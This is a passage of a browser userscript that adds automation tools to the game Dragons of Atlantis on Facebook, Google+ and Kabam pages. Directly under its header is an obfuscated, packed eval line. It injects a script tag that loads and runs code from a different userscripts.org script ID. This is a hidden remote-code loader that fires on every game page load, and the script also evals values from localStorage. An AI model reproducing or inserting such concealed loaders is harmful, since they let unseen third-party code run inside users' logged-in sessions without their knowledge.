﻿// ==UserScript==
// @name            KabaListics Plus (Mod by Moratie)
// @namespace       http://userscripts.org/scripts/show/128181
// @description     Enhanced Power Tools for Dragons of Atlantis, modded by Moratie
// @include         *://apps.facebook.com/dragonsofatlantis/*
// @include         *://*.castle.wonderhill.com/platforms/*/game
// @match           *://apps.facebook.com/dragonsofatlantis/*
// @match           *://*.castle.wonderhill.com/platforms/*/game
// @include         *://plus.google.com/games/659749063556*
// @include         *://plus.google.com/*/games/659749063556*
// @include         *://*.googleusercontent.com/gadgets/ifr?url=app://659749063556*
// @match           *://plus.google.com/games/659749063556*
// @match           *://*.googleusercontent.com/gadgets/ifr?url=app://659749063556*
// @include         *://www.kabam.com/dragons-of-atlantis/play
// @exclude         *://apps.facebook.com/dragonsofatlantis/rubies
// @exclude         *://apps.facebook.com/ai.php*
// @exclude         *://www.facebook.com/plugins/like.php*
// @exclude         *://kabam1-a.akamaihd.net/pixelkabam/*
// @exclude         *://*.akamaihd.net/pixelkabam/*
// @exclude         *://plus.google.com/_/apps-static/*
// @exclude         *://plus.google.com/u/0/_/gadgets/contactPicker*
// @exclude         *://accounts.google.com/*
// @exclude         *://talkgadget.google.com/*
// @exclude         *://www.googleapis.com/static*
// @version         2012.0527a
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



/*	===== TO DO =====
	- Review of march handling (max simultaneous march per types & to fix more than one tab enabled at the same time)
	- Bookmarks enhancements (to add sequences, loop on sequences, to review report deletion)
	- Wall management (add abaility to set Max troop minus a number of troops to keep in city. i.e. Max Lava - 25k)
	- Add speed-ups for current training queues
	- G+ page layout review
	- Training times
	- Auto-training
	===== TO DO =====
*/

(function() {

var scriptVersion	= '2012.0527a';

// To remove header bar "play | rubies | ...."
var REMOVE_HD = false;

/********************************************************************************
* Check to see if script is running in an iframe or not and removes            *
* unnecessary elements before continuing with the script.                      *
*                                                                              *
* Current actions:                                                             *
*  - Set width all parent div of 'iframe_canvas' to 100%                       *
*  - Hide 'rightCol' div                                                       *
*  - Hide unwanted objects                                                     *
*  - Set width of 'hd' div to 760px                                            *
*  - Set margin of parent to game object to 0px                                *
*  - Hide unwanted elements in 'hd' div                                        *
*  - Hide 'ft' div                                                             *
********************************************************************************/
var window = unsafeWindow || window;

// Check all iframes where the code should not be executed
if (/(pixelkabam|akamaihd|plugins|ai\.php|talkgadget|notifications|contactPicker|accounts|googleapis\.com\/static)/.test(window.location.href)) return;

// Check if we are in the right sites (in case of the Metadata Blocks don't work)
if ( !( (/apps\.facebook\.com\/dragonsofatlantis/.test(window.location.href) && /rubies/.test(window.location.pathname) == false) ||
 		/castle\.wonderhill\.com\/platforms\/.+\/game/.test(window.location.href) ||
 		/plus\.google\.com.*\/games.*\/659749063556/.test(window.location.href)         || 
 		/googleusercontent\.com\/gadgets\/.*\/659749063556/.test(window.location.href)  || 
 		/kabam.com\/dragons-of-atlantis\/play/.test(window.location.href)
 	)){
 		return;
}
var REALM_URL = '';


if (window.top === window.self) {
	function setWide() {
		if ( window.location.href.indexOf('facebook') !== -1 ) {
			iframe	 = document.getElementById('iframe_canvas');
			platform = 'facebook';
			REALM_URL = 'http://apps.facebook.com/dragonsofatlantis/realm/';
		}
		else if ( window.location.href.indexOf("google") !== -1 ) {
			iframe	 = document.getElementById('oz-gadgets-canvas-iframe-659749063556'); //content').getElementsByTagName('iframe');
			platform = 'google';
		}
		else if ( window.location.href.indexOf("kabam.com") !== -1 ) {
			iframe	 = document.getElementById('game_frame');
			platform = 'kabam';
			REALM_URL = 'https://www.kabam.com/dragons-of-atlantis/play/game/8?path=/realm/';
		}

		if (!iframe || iframe.length < 1) {
			setTimeout (setWide, 1000);
			return;
		}
		var background_118446 = localStorage.getItem( '118446_background' );
		var USE_BACKGROUND = (background_118446 && background_118446 != undefined && background_118446 != null) ? eval(background_118446) : true;
		switch (platform) {
			case 'facebook' :
				while ((iframe = iframe.parentNode) != null) {
					if (iframe.tagName == 'DIV')
						iframe.style.width = '100%';
				}
				document.getElementById('rightCol').style.display = 'none';
				document.getElementById('rightCol').style.display = 'none';
				document.getElementById('blueBarHolder').style.display = 'none';
				document.getElementById('blueBar').style.display = 'none';
				document.getElementById('pageHead').style.display = 'none';
				document.getElementById('jewelContainer').style.display = 'none';
				document.getElementById('headNav').style.display = 'none';
				document.getElementById('contentCol').style.margin = '0px';
				document.getElementById('contentCol').style.background = 'transparent';
				var contentColChild = document.getElementById('contentCol').childNodes;
				for (var i=0; i<contentColChild.length; i++)
					if (contentColChild[i].tagName == 'DIV')
						contentColChild[i].style.margin = '0px';
				document.scrollTop = '42px';
				if (USE_BACKGROUND) {
					var body_elements = document.getElementsByTagName ('body');
					for (var el=0; el < body_elements.length; el++)
						body_elements[el].style.background = '#888 url(https://kabam1-a.akamaihd.net/wwwkabam/cdn/sites/doa/img/bg_doa.jpg)';
				}
				break;
			case 'google' :
				var iframeTag = document.getElementById('content').getElementsByTagName('iframe');
				var iframeId = iframeTag[0].id;
				var iframe = document.getElementById(iframeId);
				while ((iframe = iframe.parentNode) != null) {
					if (iframe.tagName == 'DIV') {
						iframe.style.width = '100%';
						iframe.style.margin = '0';
						iframe.style.border = '0';
						iframe.style.backgroundColor = 'transparent';
					}
					if (iframe.tagName == 'DIV' && iframe.className == "Mca") {
						var found = false;
						var div_elements = iframe.getElementsByTagName('div');
						for (var i=0; i<div_elements.length && !found; i++) {
							if (div_elements[i].className == "Pca") {
								div_elements[i].style.display = 'none';
								found = true;
							}
						}
					}
				}
				var div_elements = document.getElementById('content').parentNode.getElementsByTagName('div');
				for (var i=0; i<div_elements.length; i++) {
					var content_dependent = false;
					if (div_elements[i].id == 'content') content_dependent = true;
					var parentElement = div_elements[i].parentNode;
					while (!content_dependent && parentElement) {
						if (parentElement.tagName == 'DIV' && parentElement.id == 'content')
							content_dependent = true;
						else
							parentElement = parentElement.parentNode;
					}
					if (!content_dependent)
						div_elements[i].style.display = 'none';
					else {
						if (div_elements[i].className == "ezXKfc aTjDHb") div_elements[i].style.display = 'none';
						if (div_elements[i].className == "ZXy9Tc VR8ITe") div_elements[i].style.display = 'none';
						if (div_elements[i].className == "i4a wDb") div_elements[i].style.display = 'none';
						if (div_elements[i].className == "Xrb DDb") div_elements[i].style.display = 'none';
						if (div_elements[i].className == "NPb k5 gEb") div_elements[i].style.display = 'none';
						if (div_elements[i].className == "ekW7J" || div_elements[i].className == "OK NQ bh") {
							div_elements[i].style.display = 'none';
							if (div_elements[i].parentNode.tagName == 'NAV') div_elements[i].parentNode.style.display = 'none';
						}
					}
				}
				var found = false;
				var body_elements = document.getElementsByTagName ('body');
				for (var el=0; el < body_elements.length; el++) {
					var div_elements = body_elements[el].getElementsByTagName('div');
					for (var i=0; i<div_elements.length && !found; i++) {
						if (div_elements[i].className == "c-cb-V c-i-cb-V" || div_elements[i].className == "c-C c-cb-C" || div_elements[i].className == "c-cb-vf-V") {
							div_elements[i].style.display = 'none';
							found = true;
						}
					}
				}
				break;
			case 'kabam' :
				iframe.style.width = '100%';
				iframe.style.margin = '0';
				iframe.style.border = '0';
				if (USE_BACKGROUND)
					iframe.style.backgroundColor = 'transparent';
				else
					iframe.style.backgroundColor = 'white';
				while ((iframe = iframe.parentNode) != null) {
					if (iframe.tagName == 'DIV') {
						iframe.style.width = '100%';
						iframe.style.margin = '0';
						iframe.style.border = '0';
						iframe.style.backgroundColor = 'transparent';
					}
				}
				break;
		}
	}
	setWide();
} else {
	platform = document.body.className.split(' ');
	if (platform && platform[0]){
		platform = platform[0].replace(/(platforms_|_game)/g,'');
	} else {
		platform = 'google';
	}
	var errors = 0;
	function setHigh() {
		clearTimeout;
		var object = document.getElementsByTagName('object');
		if (object.length < 1 || (window.location.hostname.indexOf("realm") == -1 && platform != 'google')) {
			if ( ++errors > 6 ){
				errors = 0;
				window.location =  window.location.href;
			}
			setTimeout (setHigh, 1000);
			return;
		}
		var background_118446 = localStorage.getItem( '118446_background' );
		var USE_BACKGROUND = (background_118446 && background_118446 != undefined && background_118446 != null) ? eval(background_118446) : true;
		switch (platform) {
			case 'facebook' :
				REALM_URL = 'http://apps.facebook.com/dragonsofatlantis/realm/';
				for (var i=0; i<object.length; i++) {
					switch (object[i].parentNode.id) {
						case 'hd' :
							object[i].style.display = 'none'; 
							break;
						default :
							object[i].parentNode.style.margin = '0px';
					}
				}
				document.getElementById('hd').parentNode.style.width = '760px';
				var hdChild = document.getElementById('hd').childNodes;
				for (var i=0; i<hdChild.length; i++)
					if (hdChild[i].tagName == 'DIV') hdChild[i].style.display = 'none';  
				document.getElementById('ft').style.display = 'none';
				document.scrollTop = '42px';
				if (REMOVE_HD) document.getElementById('hd').style.display = 'none';
				if (USE_BACKGROUND) {
					var body_elements = document.getElementsByTagName ('body');
					for (var el=0; el < body_elements.length; el++)
						body_elements[el].style.background = 'transparent';
					var html_elements = document.getElementsByTagName ('html');
					for (var el=0; el < html_elements.length; el++)
						html_elements[el].style.background = 'transparent';
				}
				break;
			case 'google' :
				document.getElementById('pane_hd').style.display = 'none';
				if (USE_BACKGROUND) {
					var body_elements = document.getElementsByTagName ('body');
					for (var el=0; el < body_elements.length; el++) {
						body_elements[el].style.background = 'transparent';
						body_elements[el].style.background = '#888 url(https://kabam1-a.akamaihd.net/wwwkabam/cdn/sites/doa/img/bg_doa.jpg)';
					}
				}
				break;
			case 'kabam' :
				REALM_URL = 'https://www.kabam.com/dragons-of-atlantis/play/game/8?path=/realm/';
				var html_elements = document.getElementsByTagName ('html');
				for (var el=0; el < html_elements.length; el++) {
					html_elements[el].style.overflow = 'hidden'
					html_elements[el].style.backgroundColor = 'transparent';
				}
				if (!USE_BACKGROUND) document.body.style.backgroundColor = 'white';
				break;
		}
		initScript(object);
	}
	setHigh();
}



function initScript (SWF_OBJECT) {
/********************************************************************************
* All global variables MUST be set here or they will not be available to all   *
* functions throughout the script.                                             *
********************************************************************************/
var api_version		= 'spinal';

// Styles List
var styleList = [
 'bnt_blue',
 'blue',
 'bnt_cyan',
 'bnt_green',
 'btn_on',
 'btn_off',
 'bnt_red',
 'bnt_purple',
 'bnt_red',
 'bnt_yellow',
 'bold_red',
 'compact_table',
 'content',
 'content_table',
 'defending',
 'hiding',
 'popup_bar',
 'popup_close',
 'popup_main',
 'popup_outer',
 'popup_top',
 'row_headers',
 'row_top_headers',
 'row_headers',
 'row_style',
 'scrollable',
 'status_feedback',
 'status_report',
 'status_ticker',
 'md_status_ticker',
 'subtitle',
 'support_link',
 'table',
 'table_console',
 'table_headers',
 'table_targets',
 'title',
 'red',
 'green',
 'btn_disabled',
 'title_main',
 'info_protect',
 'info_alerts',
 'doa-icons',
 ];

// Skins
var urlBackgroundImage = 'data:image/png;base64,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';
var urlIcons = 'http://www.inforem.de/page2/tool/iconset1.png';

// Alert sound
var DEFAULT_ALERT_SOUND_URL = 'http://www.inforem.de/page2/tool/alarm.mp3';
var SWF_PLAYER_URL = 'http://flash-mp3-player.net/medias/player_mp3_multi.swf';
var DEFAULT_BUILDING_SOUND_URL = 'http://wackoscripts.com/mp3/construction.mp3';
var DEFAULT_TRAINING_SOUND_URL = 'http://wackoscripts.com/mp3/training.mp3';
var DEFAULT_RESEARCH_SOUND_URL = 'http://wackoscripts.com/mp3/research.mp3';

// Tab order
var INFO_TAB_ORDER			= 1;     
var JOBS_TAB_ORDER			= 2;
var WAVE_TAB_ORDER			= 3;
var ATTACK_TAB_ORDER		= 4;
var BOOKMARK_TAB_ORDER		= 5;
var ALLIANCE_TAB_ORDER		= 6;
var LEADERBOARD_TAB_ORDER 	= 7;
var SEARCH_TAB_ORDER		= 8;
var TOWER_TAB_ORDER			= 9;
var OPTIONS_TAB_ORDER		= 98;
var LOG_TAB_ORDER			= 99;

// Tab enable/disable
var INFO_TAB_ENABLE			= true;     
var WAVE_TAB_ENABLE			= true;
var ATTACK_TAB_ENABLE		= true;
var BOOKMARK_TAB_ENABLE		= true;
var JOBS_TAB_ENABLE			= true;
var OPTIONS_TAB_ENABLE		= true;
var LOG_TAB_ENABLE			= true;
var SEARCH_TAB_ENABLE		= true;
var ALLIANCE_TAB_ENABLE		= true;
var LEADERBOARD_TAB_ENABLE	= true;
var TOWER_TAB_ENABLE		= true;

// CHECK THESE VARIABLES
var DEBUG_TRACE_AJAX	= 2;
var DEBUG_MARCHES		= false;
var EMULATE_NET_ERROR	= 0;  // percentage
var ENABLE_WINLOG		= false;
var ALERT_ON_BAD_DATA	= false;
var MIN_DELAY			= 15;
var MIN_DELAY_BETWEEN_WAVE = 30;
var MAP_DELAY			= 750;
var MapRadius			= 35;

var BUTTON_BGCOLOR		= '#436';
var JOB_BUTTON_BGCOLOR	= '#436';

// Jawz - Message handling
var MESSAGES_ALL = 0;
var MESSAGES_ONLY = 1;
var REPORTS_ONLY = 2;
// Jawz - Message types
var MSG_BATTLE_REPORT = 1;
var TRANSPORT_MARCH_REPORT = 2;
var SPY_REPORT = 3;
var SENTINEL_WARNING = 4;
var REINFORCEMENTS_REPORT = 5;
var SYSTEM_MESSAGE = 6;
var PLAYER_MESSAGE = 7;
var ALLIANCE_MESSAGE = 8;

// Jawz - Capital and outposts IDs
var CAPITAL_ID = 0;
var SPECTRAL_OUTPOST_ID = 1;
var ICE_OUTPOST_ID = 2;
var SWAMP_OUTPOST_ID = 3;
var FOREST_OUTPOST_ID = 4;
var DESERT_OUTPOST_ID = 5;
var WATER_OUTPOST_ID = 6;
var STONE_OUTPOST_ID = 7;
var FIRE_OUTPOST_ID = 8;
var WIND_OUTPOST_ID = 9;

var IsChrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;

//
// Variables strings
//
// Terrain
var kAnthropusCamp		= 'AnthropusCamp';
var kCity				= 'City';
var kForest				= 'Forest';
var kGrassland			= 'Grassland';
var kHill				= 'Hill';
var kLake				= 'Lake';
var kMountain			= 'Mountain';
var kOutpost			= 'Outpost';
var kPlain				= 'Plain';
var kBog				= 'Bog';
var kWildernesses		= 'Wildernesses';
var kFog				= 'Fog';
var kSwamp				= 'Swamp';

// Buildings
var kDragonKeep			= 'DragonKeep';
var kFactory			= 'Factory';
var kFarm				= 'Farm';
var kFortress			= 'Fortress';
var kGarrison			= 'Garrison';
var kHome				= 'Home';
var kLumbermill			= 'Lumbermill';
var kMetalsmith			= 'Metalsmith';
var kMine				= 'Mine';
var kMusterPoint		= 'MusterPoint';
var kOfficerQuarter		= 'OfficerQuarter';
var kQuarry				= 'Quarry';
var kRookery			= 'Rookery';
var kScienceCenter		= 'ScienceCenter';
var kSentinel			= 'Sentinel';
var kSilo				= 'Silo';
var kStorageVault		= 'StorageVault';
var kTheater			= 'Theater';
var kTrainingCamp		= 'TrainingCamp';
var kWall				= 'Wall';
// Jawz - Added for spectral outpost
var kSpectralDragonKeep	= 'SpectralDragonKeep';
var kDarkPortal			= 'DarkPortal';
var kMausoleum			= 'Mausoleum';
var kEnergyCollector	= 'EnergyCollector';

// Research
var kAgriculture		= 'Agriculture';
var kWoodcraft			= 'Woodcraft';
var kMasonry			= 'Masonry';
var kMining				= 'Mining';
var kClairvoyance		= 'Clairvoyance';
var kRapidDeployment	= 'RapidDeployment';
var kBallistics			= 'Ballistics';
var kMetallurgy			= 'Metallurgy';
var kMedicine			= 'Medicine';
var kDragonry			= 'Dragonry';
var kLevitation			= 'Levitation';
var kMercantilism		= 'Mercantilism';
var kAerialCombat		= 'AerialCombat';
var kEnergyCollection	= 'EnergyCollection';
var kWarriorRevival		= 'WarriorRevival';
var kGuardianRevival	= 'GuardianRevival';

// Troops
var kArmoredTransport	= 'ArmoredTransport';
var kBattleDragon		= 'BattleDragon';
var kConscript			= 'Conscript';
var kFireMirror			= 'FireMirror';
var kGiant				= 'Giant';
var kHalberdsman		= 'Halberdsman';
var kLongbowman			= 'Longbowman';
var kMinotaur			= 'Minotaur';
var kPorter				= 'Porter';
var kSpy				= 'Spy';
var kSwiftStrikeDragon	= 'SwiftStrikeDragon';

// Special Troops
var kAquaTroop			= 'AquaTroop';
var kFireTroop			= 'FireTroop';
var kStoneTroop			= 'StoneTroop';
var kWindTroop			= 'WindTroop';
var kIceTroop			= 'IceTroop';
var kSwampTroop			= 'SwampTroop';
var kPackDragon			= 'PackDragon';
var kFrostGiant			= 'FrostGiant';
var kForestTroop		= 'ForestTroop';
var kDesertTroop		= 'DesertTroop';

// Dragons
var kFireDragon			= 'FireDragon';
var kGreatDragon		= 'GreatDragon';
var kStoneDragon		= 'StoneDragon';
var kWaterDragon		= 'WaterDragon';
var kWindDragon			= 'WindDragon';
var kIceDragon			= 'IceDragon';
var kSwampDragon		= 'SwampDragon';
var kSpectralDragon		= 'SpectralDragon';
var kForestDragon		= 'ForestDragon';
var kDesertDragon		= 'DesertDragon';

// Troop abbreviations
var kATrans		= 'ATrans';
var kWTroop		= 'Banshee';
var kBatDrg		= 'BatDrg';
var kConscr		= 'Conscr';
var kATroop		= 'Fang';
var kFireM		= 'FireM';
var kITroop		= 'SReaper';
var kFireDrg	= 'FireDrg';
var kGrtDrg		= 'GrtDrg';
var kHalbrd		= 'Halbrd';
var kFTroop		= 'Magma';
var kLBM		= 'LBM';
var kMino		= 'Mino';
var kSTroop		= 'Ogre';
var kSwTroop	= 'Venom';
var kSSDrg		= 'SSDrg';
var kStnDrg		= 'StnDrg';
var kWatDrg		= 'WatDrg';
var kWndDrg		= 'WndDrg';
var kIceDrg		= 'IceDrg';
var kSwpDrg		= 'SwpDrg';
var kPackDrg	= 'PackDrg';
var kSpctDrg	= 'SpctDrg';
var kFGiant		= 'FGiant';
var kForDrg		= 'ForDrg';
var kForTroop	= 'Titan';
var kDesDrg		= 'DesDrg';
var kDTroop		= 'Strider';

// Items
var kAquaTroopRespirator	= 'AquaTroopRespirator';
var kStoneTroopItem			= 'StoneTroopItem';
var kFireTroopItem			= 'FireTroopItem';
var kWindTroopItem			= 'WindTroopItem';
var kIceTroopItem			= 'IceTroopItem';
var kSwampTroopItem			= 'SwampTroopItem';
var kFrostGiantItem			= 'FrostGiantItem';
var kForestTroopItem		= 'ForestTroopItem';

// Error messages
var kFatalSeedTitle	= 'ERROR WHILST FETCHING DATA FROM SERVER';
var kFatalSeedMsg	= 'Please disable the script and see if you are able to play the game manually. If normal play is possible then enable the script and try again. If the error persists please read the following post before submitting a report. If normal play is not possible then wait until it is and try again.';


// Main arrays used in the script
// Troops arrays
var all_dragon_list		 = [ 'GreatDragon', 'WaterDragon', 'StoneDragon', 'FireDragon', 'WindDragon', 'IceDragon', 'SwampDragon', 'ForestDragon', 'DesertDragon', 'SpectralDragon'];
var all_unit_types		 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kPackDragon, kAquaTroop, kStoneTroop, kFireTroop, kWindTroop, kIceTroop, kSwampTroop, kFrostGiant, kForestTroop, kDesertTroop];
var capital_units		 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror ];
var water_outpost_units	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kAquaTroop];
var stone_outpost_units	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kStoneTroop];
var fire_outpost_units	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kFireTroop];
var wind_outpost_units	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kWindTroop];
var ice_outpost_units	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kIceTroop, kFrostGiant];
var swamp_outpost_units	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kSwampTroop];
var forest_outpost_units = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kForestTroop];
var desert_outpost_units = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kDesertTroop];
var all_trainable_units	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kGiant, kFireMirror, kAquaTroop, kStoneTroop, kFireTroop, kWindTroop, kIceTroop, kSwampTroop, kFrostGiant, kForestTroop, kDesertTroop];
var attack_unit_types	 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kSwiftStrikeDragon, kBattleDragon, kArmoredTransport, kPackDragon, kGiant, kFireMirror, kAquaTroop, kStoneTroop, kFireTroop, kWindTroop, kIceTroop, kSwampTroop, kFrostGiant, kForestTroop, kDesertTroop];
var wave_unit_types		 = [ kPorter, kConscript, kSpy, kHalberdsman, kMinotaur, kLongbowman, kArmoredTransport, kPackDragon, kSwiftStrikeDragon, kBattleDragon, kGiant, kFireMirror, kAquaTroop, kStoneTroop, kFireTroop, kWindTroop, kIceTroop, kSwampTroop, kFrostGiant, kForestTroop, kDesertTroop];
var transport_unit_types = [ kPorter, kATrans, kPackDrg ]; // Beware : Use abbreviations here
// Resources arrays
var all_resource_types				= [	'gold', 'food', 'wood', 'ore', 'stone', 'blue_energy'];
var all_resource_types2				= [	'gold', 'food', 'wood', 'ore', 'stone'];
var transportable_resource_types	= [	'gold', 'food', 'wood', 'ore', 'stone'];
// Buildings arrays
var capital_buildings	= [	kHome, kGarrison, kScienceCenter, kMetalsmith, kOfficerQuarter, kMusterPoint, kRookery, kStorageVault, kTheater, kSentinel, kFactory, kFortress, kDragonKeep, kWall];
var outpost_buildings	= [	kTrainingCamp, kHome, kSilo, kMusterPoint, kDragonKeep, kWall];
var field_buildings		= [	kMine, kFarm, kLumbermill, kQuarry];
var spectral_buildings	= [	kDarkPortal, kMausoleum, kSpectralDragonKeep];
var spectral_fields		= [	kEnergyCollector];
// Research arrays
var research_list		= {	Agriculture:'Agriculture', Woodcraft:kWoodcraft, Masonry:'Masonry', Mining:kMining, Clairvoyance:'Clairvoyance', RapidDeployment:'RapidDeployment', Ballistics:'Ballistics', Metallurgy:'Metallurgy', Medicine:'Medicine', Dragonry:kDragonry, Levitation:kLevitation, Mercantilism:'Mercantilism', AerialCombat:'AerialCombat', EnergyCollection:'EnergyCollection', WarriorRevival:'WarriorRevival', GuardianRevival:'GuardianRevival'};
var research_name		= [	kAgriculture, kWoodcraft, kMasonry, kMining, kClairvoyance, kRapidDeployment, kBallistics, kMetallurgy, kMedicine, kDragonry, kLevitation, kMercantilism, kAerialCombat, kEnergyCollection, kWarriorRevival, kGuardianRevival];
// Items arrays
var armor_item_list     = [	'GreatDragonClawGuards','GreatDragonBodyArmor',	'GreatDragonTailGuard',	'GreatDragonHelmet',
							'WaterDragonHelmet',	'WaterDragonBodyArmor',	'WaterDragonClawGuards','WaterDragonTailGuard',
							'StoneDragonHelmet',	'StoneDragonClawGuards','StoneDragonTailGuard',	'StoneDragonBodyArmor',
							'FireDragonHelmet',		'FireDragonClawGuards',	'FireDragonTailGuard',	'FireDragonBodyArmor',
							'WindDragonHelmet',		'WindDragonClawGuards',	'WindDragonTailGuard',	'WindDragonBodyArmor',
							'SpectralDragonHead',	'SpectralDragonTalons',	'SpectralDragonTail',	'SpectralDragonBody', 
							'SpectralDragonHelmet', 'SpectralDragonClawGuards','SpectralDragonTailGuard','SpectralDragonBodyArmor', 
